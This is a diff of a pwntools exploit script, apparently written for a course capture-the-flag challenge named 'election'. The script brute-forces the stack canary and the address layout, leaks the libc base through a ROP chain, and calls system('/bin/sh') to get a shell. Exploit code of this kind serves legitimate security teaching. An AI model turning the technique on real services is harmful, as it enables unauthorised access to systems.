@@ -3,9 +3,9 @@ from pwn import *
 context.clear(arch='x86_64')
 
 r = process('./election')
+# r = remote('edu-ctf.csie.org', 10180)
 libc = ELF('./libc.so')
 elf = ELF('./election')
-# r = remote('', 10180)
 
 # some token array
 token = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
@@ -13,9 +13,6 @@ token = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
 offset_binsh = next(libc.search('/bin/sh'))
 offset_system = libc.symbols['system']
 offset_puts = elf.symbols['puts']
-print('offset_binsh --> ', hex(offset_binsh))
-print('offset_system --> ', hex(offset_system))
-print('offset_puts --> ', hex(offset_puts))
 
 # accumulate vote for enough space to write buffer
 angel_vote = 0
@@ -58,9 +55,6 @@ def hack_vote_ret(canary, base, step):
     r.recvuntil('Message: ')
     #         |msg | cannary   |   rbp       |   ret            |)
     r.sendline(msg + canary    +  rbp        + p64(pop_r14r15_ret))
-    if step == 1:
-        print('last step ')
-        pause()
 
     r.recvuntil('>')
     r.sendline('3')
@@ -153,11 +147,8 @@ def rop_libc_base(canary, base):
     addr_main = base + 0xffb
     p += p64(addr_main)
 
-    print('pop_rdi for libc_base --> ', hex(pop_rdi))
     print('libc_start_main for libc_base --> ', hex(libc_start_main))
     print('puts for libc_base --> ', hex(puts))
-    print('addr_main for ret main --> ', hex(addr_main))
-    print('ROP for libc_base --> ', p)
     return p
 
 def rop_shell(canary, base, libc_base):
@@ -172,7 +163,7 @@ def rop_shell(canary, base, libc_base):
     system = libc_base + offset_system
     p += p64(system)
 
-    print('libc_base for pwn ', hex(libc_base))
+    print('libc_base for pwn  ', hex(libc_base))
     print('bin_sh for pwn --> ', hex(bin_sh))
     print('system for pwn --> ', hex(system))
 
@@ -183,14 +174,12 @@ def write_token(p):
     r.sendline('2')
     r.recvuntil('token: ')
     r.sendline('\x00' * 0xb8)
-    # print('finished clearing token')
 
     # write the ROP of leaking libc in token
     r.recvuntil('>')
     r.sendline('2')
     r.recvuntil('token: ')
     r.sendline(p)
-    # print('finished writing payload token')
 
 def vote_to_max():
     # vote for writing more buffer
@@ -207,7 +196,6 @@ def vote_to_max():
 
 def main():
     # brute force finding canary, and some ASLR-shit
-    pause()
     canary, base = hack_canary_ASLR()
 
     vote_to_max()
@@ -219,7 +207,7 @@ def main():
 
     libc_base = hack_vote_ret(canary, base, 0)
 
-    # vote again for buffer
+    # vote again for enough buffer
     vote_to_max()
 
     p2 = rop_shell(canary, base, libc_base)
